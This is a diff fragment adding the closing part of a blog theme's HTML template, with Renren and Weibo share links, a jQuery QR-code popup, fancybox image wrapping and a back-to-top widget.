+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
